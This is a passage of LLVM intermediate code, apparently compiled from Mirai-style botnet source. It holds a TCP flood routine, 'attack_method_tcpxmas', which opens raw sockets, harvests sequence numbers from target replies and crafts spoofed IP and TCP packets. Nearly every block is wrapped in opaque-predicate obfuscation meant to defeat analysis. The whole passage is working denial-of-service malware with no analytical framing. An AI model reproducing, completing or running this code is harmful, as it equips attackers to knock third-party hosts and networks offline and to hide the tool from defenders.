  %1045 = sext i32 %1044 to i64
  %1046 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1043, i64 %1045
  %1047 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1046, i32 0, i32 0
  %1048 = bitcast %struct.sockaddr_in* %1047 to %struct.sockaddr*
  store %struct.sockaddr* %1048, %struct.sockaddr** %1042, align 8
  %1049 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %1050 = load %struct.sockaddr*, %struct.sockaddr** %1049, align 8
  %1051 = call i64 @sendto(i32 %1037, i8* %1038, i64 %1041, i32 16384, %struct.sockaddr* %1050, i32 16)
  br label %originalBB291

originalBB327alteredBB:                           ; preds = %originalBB327, %798
  br label %originalBB327
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.31
  %6 = load i32, i32* @y.32
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %struct.attack_stomp_data*, align 8
  %20 = alloca i8**, align 8
  %21 = alloca i8, align 1
  %22 = alloca i16, align 2
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i16, align 2
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca i8, align 1
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i32, align 4
  %33 = alloca i8, align 1
  %34 = alloca i32, align 4
  %35 = alloca %struct.sockaddr_in, align 4
  %36 = alloca %struct.sockaddr_in, align 4
  %37 = alloca i32, align 4
  %38 = alloca [256 x i8], align 16
  %39 = alloca i64, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %41 = alloca i32, align 4
  %42 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %43 = alloca %struct.tcphdr*, align 8
  %44 = alloca %struct.iphdr*, align 8
  %45 = alloca %struct.tcphdr*, align 8
  %46 = alloca i8*, align 8
  %47 = alloca i8*, align 8
  %48 = alloca %struct.iphdr*, align 8
  %49 = alloca %struct.tcphdr*, align 8
  %50 = alloca i8*, align 8
  %51 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %52 = load i8, i8* %13, align 1
  %53 = zext i8 %52 to i64
  %54 = call noalias i8* @calloc(i64 %53, i64 16) #6
  %55 = bitcast i8* %54 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %55, %struct.attack_stomp_data** %19, align 8
  %56 = load i8, i8* %13, align 1
  %57 = zext i8 %56 to i64
  %58 = call noalias i8* @calloc(i64 %57, i64 8) #6
  %59 = bitcast i8* %58 to i8**
  store i8** %59, i8*** %20, align 8
  %60 = load i8, i8* %15, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 2, i32 0)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %21, align 1
  %64 = load i8, i8* %15, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 3, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %22, align 2
  %68 = load i8, i8* %15, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 4, i32 64)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %23, align 1
  %72 = load i8, i8* %15, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 5, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %24, align 1
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 7, i32 65535)
  %79 = trunc i32 %78 to i16
  store i16 %79, i16* %25, align 2
  %80 = load i8, i8* %15, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 11, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %26, align 1
  %84 = load i8, i8* %15, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 12, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %27, align 1
  %88 = load i8, i8* %15, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 13, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %28, align 1
  %92 = load i8, i8* %15, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 14, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %29, align 1
  %96 = load i8, i8* %15, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 15, i32 1)
  %99 = trunc i32 %98 to i8
  store i8 %99, i8* %30, align 1
  %100 = load i8, i8* %15, align 1
  %101 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %102 = call i32 @attack_get_opt_int(i8 zeroext %100, %struct.attack_option* %101, i8 zeroext 16, i32 1)
  %103 = trunc i32 %102 to i8
  store i8 %103, i8* %31, align 1
  %104 = load i8, i8* %15, align 1
  %105 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %106 = call i32 @attack_get_opt_int(i8 zeroext %104, %struct.attack_option* %105, i8 zeroext 0, i32 768)
  store i32 %106, i32* %32, align 4
  %107 = load i8, i8* %15, align 1
  %108 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %109 = call i32 @attack_get_opt_int(i8 zeroext %107, %struct.attack_option* %108, i8 zeroext 1, i32 1)
  %110 = trunc i32 %109 to i8
  store i8 %110, i8* %33, align 1
  %111 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %111, i32* %18, align 4
  %112 = icmp eq i32 %111, -1
  %113 = load i32, i32* @x.31
  %114 = load i32, i32* @y.32
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %112, label %121, label %138

; <label>:121:                                    ; preds = %originalBBpart2
  %122 = load i32, i32* @x.31
  %123 = load i32, i32* @y.32
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %121
  %130 = load i32, i32* @x.31
  %131 = load i32, i32* @y.32
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %767

; <label>:138:                                    ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %139 = load i32, i32* %18, align 4
  %140 = bitcast i32* %17 to i8*
  %141 = call i32 @setsockopt(i32 %139, i32 0, i32 3, i8* %140, i32 4) #6
  %142 = icmp eq i32 %141, -1
  br i1 %142, label %143, label %146

; <label>:143:                                    ; preds = %138
  %144 = load i32, i32* %18, align 4
  %145 = call i32 @close(i32 %144)
  br label %767

; <label>:146:                                    ; preds = %138
  %147 = load i32, i32* @x.31
  %148 = load i32, i32* @y.32
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %146
  store i32 0, i32* %17, align 4
  %155 = load i32, i32* @x.31
  %156 = load i32, i32* @y.32
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %163

; <label>:163:                                    ; preds = %originalBBpart253, %originalBBpart28
  %164 = load i32, i32* %17, align 4
  %165 = load i8, i8* %13, align 1
  %166 = zext i8 %165 to i32
  %167 = icmp slt i32 %164, %166
  br i1 %167, label %168, label %607

; <label>:168:                                    ; preds = %163
  br label %169

; <label>:169:                                    ; preds = %583, %556, %168
  %170 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %170, i32* %34, align 4
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %189

; <label>:172:                                    ; preds = %169
  %173 = load i32, i32* @x.31
  %174 = load i32, i32* @y.32
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %172
  %181 = load i32, i32* @x.31
  %182 = load i32, i32* @y.32
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %588

; <label>:189:                                    ; preds = %169
  %190 = load i32, i32* @x.31
  %191 = load i32, i32* @y.32
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %189
  %198 = load i32, i32* %34, align 4
  %199 = load i32, i32* %34, align 4
  %200 = call i32 (i32, i32, ...) @fcntl(i32 %199, i32 3, i32 0)
  %201 = or i32 %200, 2048
  %202 = call i32 (i32, i32, ...) @fcntl(i32 %198, i32 4, i32 %201)
  %203 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 0
  store i16 2, i16* %203, align 4
  %204 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %205 = load i32, i32* %17, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 2
  %209 = load i8, i8* %208, align 4
  %210 = zext i8 %209 to i32
  %211 = icmp slt i32 %210, 32
  %212 = load i32, i32* @x.31
  %213 = load i32, i32* @y.32
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBBpart223, label %originalBB14alteredBB

originalBBpart223:                                ; preds = %originalBB14
  br i1 %211, label %220, label %241

; <label>:220:                                    ; preds = %originalBBpart223
  %221 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %222 = load i32, i32* %17, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %221, i64 %223
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %224, i32 0, i32 1
  %226 = load i32, i32* %225, align 4
  %227 = call i32 @ntohl(i32 %226) #7
  %228 = call i32 @rand_next()
  %229 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %230 = load i32, i32* %17, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i64 %231
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i32 0, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = zext i8 %234 to i32
  %236 = lshr i32 %228, %235
  %237 = add i32 %227, %236
  %238 = call i32 @htonl(i32 %237) #7
  %239 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %240 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %239, i32 0, i32 0
  store i32 %238, i32* %240, align 4
  br label %250

; <label>:241:                                    ; preds = %originalBBpart223
  %242 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %243 = load i32, i32* %17, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %242, i64 %244
  %246 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %245, i32 0, i32 1
  %247 = load i32, i32* %246, align 4
  %248 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %249 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %248, i32 0, i32 0
  store i32 %247, i32* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %241, %220
  %251 = load i16, i16* %25, align 2
  %252 = zext i16 %251 to i32
  %253 = icmp eq i32 %252, 65535
  br i1 %253, label %254, label %259

; <label>:254:                                    ; preds = %250
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 65535
  %257 = trunc i32 %256 to i16
  %258 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  store i16 %257, i16* %258, align 2
  br label %263

; <label>:259:                                    ; preds = %250
  %260 = load i16, i16* %25, align 2
  %261 = call zeroext i16 @htons(i16 zeroext %260) #7
  %262 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  store i16 %261, i16* %262, align 2
  br label %263

; <label>:263:                                    ; preds = %259, %254
  %264 = load i32, i32* %34, align 4
  %265 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %266 = bitcast %struct.sockaddr_in* %35 to %struct.sockaddr*
  store %struct.sockaddr* %266, %struct.sockaddr** %265, align 8
  %267 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %268 = load %struct.sockaddr*, %struct.sockaddr** %267, align 8
  %269 = call i32 @connect(i32 %264, %struct.sockaddr* %268, i32 16)
  %270 = call i64 @time(i64* null) #6
  store i64 %270, i64* %39, align 8
  br label %271

; <label>:271:                                    ; preds = %586, %263
  store i32 16, i32* %37, align 4
  %272 = load i32, i32* %18, align 4
  %273 = getelementptr inbounds [256 x i8], [256 x i8]* %38, i32 0, i32 0
  %274 = bitcast %union.__CONST_SOCKADDR_ARG* %42 to %struct.sockaddr**
  %275 = bitcast %struct.sockaddr_in* %36 to %struct.sockaddr*
  store %struct.sockaddr* %275, %struct.sockaddr** %274, align 8
  %276 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %42, i32 0, i32 0
  %277 = load %struct.sockaddr*, %struct.sockaddr** %276, align 8
  %278 = call i64 @recvfrom(i32 %272, i8* %273, i64 256, i32 16384, %struct.sockaddr* %277, i32* %37)
  %279 = trunc i64 %278 to i32
  store i32 %279, i32* %41, align 4
  %280 = load i32, i32* %41, align 4
  %281 = icmp eq i32 %280, -1
  br i1 %281, label %282, label %283

; <label>:282:                                    ; preds = %271
  br label %767

; <label>:283:                                    ; preds = %271
  %284 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %36, i32 0, i32 2
  %285 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 4
  %287 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %288 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 4
  %290 = icmp eq i32 %286, %289
  br i1 %290, label %291, label %562

; <label>:291:                                    ; preds = %283
  %292 = load i32, i32* %41, align 4
  %293 = sext i32 %292 to i64
  %294 = icmp ugt i64 %293, 40
  br i1 %294, label %295, label %562

; <label>:295:                                    ; preds = %291
  %296 = getelementptr inbounds [256 x i8], [256 x i8]* %38, i32 0, i32 0
  %297 = getelementptr inbounds i8, i8* %296, i64 20
  %298 = bitcast i8* %297 to %struct.tcphdr*
  store %struct.tcphdr* %298, %struct.tcphdr** %43, align 8
  %299 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %300 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %299, i32 0, i32 0
  %301 = load i16, i16* %300, align 4
  %302 = zext i16 %301 to i32
  %303 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  %304 = load i16, i16* %303, align 2
  %305 = zext i16 %304 to i32
  %306 = icmp eq i32 %302, %305
  br i1 %306, label %307, label %561

; <label>:307:                                    ; preds = %295
  %308 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 4
  %310 = load i16, i16* %309, align 4
  %311 = lshr i16 %310, 9
  %312 = and i16 %311, 1
  %313 = zext i16 %312 to i32
  %314 = icmp ne i32 %313, 0
  br i1 %314, label %315, label %540

; <label>:315:                                    ; preds = %307
  %316 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = lshr i16 %318, 12
  %320 = and i16 %319, 1
  %321 = zext i16 %320 to i32
  %322 = icmp ne i32 %321, 0
  br i1 %322, label %323, label %540

; <label>:323:                                    ; preds = %315
  %324 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %325 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %324, i32 0, i32 0
  %326 = load i32, i32* %325, align 4
  %327 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %328 = load i32, i32* %17, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %327, i64 %329
  %331 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %330, i32 0, i32 0
  store i32 %326, i32* %331, align 4
  %332 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 2
  %334 = load i32, i32* %333, align 4
  %335 = call i32 @ntohl(i32 %334) #7
  %336 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %337 = load i32, i32* %17, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %336, i64 %338
  %340 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %339, i32 0, i32 1
  store i32 %335, i32* %340, align 4
  %341 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %342 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %341, i32 0, i32 3
  %343 = load i32, i32* %342, align 4
  %344 = call i32 @ntohl(i32 %343) #7
  %345 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %346 = load i32, i32* %17, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %345, i64 %347
  %349 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %348, i32 0, i32 2
  store i32 %344, i32* %349, align 4
  %350 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %351 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %350, i32 0, i32 1
  %352 = load i16, i16* %351, align 2
  %353 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %354 = load i32, i32* %17, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %353, i64 %355
  %357 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %356, i32 0, i32 3
  store i16 %352, i16* %357, align 4
  %358 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  %359 = load i16, i16* %358, align 2
  %360 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %361 = load i32, i32* %17, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %363, i32 0, i32 4
  store i16 %359, i16* %364, align 2
  %365 = load i32, i32* %32, align 4
  %366 = sext i32 %365 to i64
  %367 = add i64 40, %366
  %368 = call noalias i8* @malloc(i64 %367) #6
  %369 = load i8**, i8*** %20, align 8
  %370 = load i32, i32* %17, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds i8*, i8** %369, i64 %371
  store i8* %368, i8** %372, align 8
  %373 = load i8**, i8*** %20, align 8
  %374 = load i32, i32* %17, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds i8*, i8** %373, i64 %375
  %377 = load i8*, i8** %376, align 8
  %378 = bitcast i8* %377 to %struct.iphdr*
  store %struct.iphdr* %378, %struct.iphdr** %44, align 8
  %379 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i64 1
  %381 = bitcast %struct.iphdr* %380 to %struct.tcphdr*
  store %struct.tcphdr* %381, %struct.tcphdr** %45, align 8
  %382 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i64 1
  %384 = bitcast %struct.tcphdr* %383 to i8*
  store i8* %384, i8** %46, align 8
  %385 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %386 = bitcast %struct.iphdr* %385 to i8*
  %387 = load i8, i8* %386, align 4
  %388 = and i8 %387, 15
  %389 = or i8 %388, 64
  store i8 %389, i8* %386, align 4
  %390 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %391 = bitcast %struct.iphdr* %390 to i8*
  %392 = load i8, i8* %391, align 4
  %393 = and i8 %392, -16
  %394 = or i8 %393, 5
  store i8 %394, i8* %391, align 4
  %395 = load i8, i8* %21, align 1
  %396 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 1
  store i8 %395, i8* %397, align 1
  %398 = load i32, i32* %32, align 4
  %399 = sext i32 %398 to i64
  %400 = add i64 40, %399
  %401 = trunc i64 %400 to i16
  %402 = call zeroext i16 @htons(i16 zeroext %401) #7
  %403 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 2
  store i16 %402, i16* %404, align 2
  %405 = load i16, i16* %22, align 2
  %406 = call zeroext i16 @htons(i16 zeroext %405) #7
  %407 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 3
  store i16 %406, i16* %408, align 4
  %409 = load i8, i8* %23, align 1
  %410 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 5
  store i8 %409, i8* %411, align 4
  %412 = load i8, i8* %24, align 1
  %413 = icmp ne i8 %412, 0
  br i1 %413, label %414, label %418

; <label>:414:                                    ; preds = %323
  %415 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %416 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 4
  store i16 %415, i16* %417, align 2
  br label %418

; <label>:418:                                    ; preds = %414, %323
  %419 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 6
  store i8 6, i8* %420, align 1
  %421 = load i32, i32* @LOCAL_ADDR, align 4
  %422 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 8
  store i32 %421, i32* %423, align 4
  %424 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %425 = load i32, i32* %17, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %424, i64 %426
  %428 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %427, i32 0, i32 0
  %429 = load i32, i32* %428, align 4
  %430 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 9
  store i32 %429, i32* %431, align 4
  %432 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %433 = load i32, i32* %17, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %435, i32 0, i32 3
  %437 = load i16, i16* %436, align 4
  %438 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %439 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %438, i32 0, i32 0
  store i16 %437, i16* %439, align 4
  %440 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %441 = load i32, i32* %17, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %443, i32 0, i32 4
  %445 = load i16, i16* %444, align 2
  %446 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 1
  store i16 %445, i16* %447, align 2
  %448 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %449 = load i32, i32* %17, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %448, i64 %450
  %452 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %451, i32 0, i32 2
  %453 = load i32, i32* %452, align 4
  %454 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i32 0, i32 2
  store i32 %453, i32* %455, align 4
  %456 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %19, align 8
  %457 = load i32, i32* %17, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %459, i32 0, i32 1
  %461 = load i32, i32* %460, align 4
  %462 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %463 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %462, i32 0, i32 3
  store i32 %461, i32* %463, align 4
  %464 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 4
  %466 = load i16, i16* %465, align 4
  %467 = and i16 %466, -241
  %468 = or i16 %467, 128
  store i16 %468, i16* %465, align 4
  %469 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %470 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %469, i32 0, i32 4
  %471 = load i16, i16* %470, align 4
  %472 = and i16 %471, -257
  %473 = or i16 %472, 256
  store i16 %473, i16* %470, align 4
